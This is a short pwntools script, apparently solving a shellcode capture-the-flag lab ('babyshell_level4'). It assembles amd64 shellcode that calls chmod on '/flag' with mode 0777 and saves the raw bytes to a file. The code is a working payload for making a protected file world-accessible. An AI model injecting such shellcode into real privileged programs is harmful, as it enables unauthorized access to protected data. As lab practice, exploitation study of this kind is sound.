

from pwn import *
context.arch = "amd64"
context.terminal = ['multixterm', '-e']  # Attempting to use multixterm

my_sc = asm('''
    mov rbx, 0x00000067616c662f
    push rbx
    mov rax, 0x5a
    mov rdi, rsp
    mov rsi, 0x1ff
    syscall

''')
# display the bytes
print(disasm(my_sc))
fd = open("ttt-raw","wb+")
fd.write(my_sc)
fd.close()
#p = gdb.debug("/challenge/babyshell_level4")
#p.send(my_sc)
#p.interactive()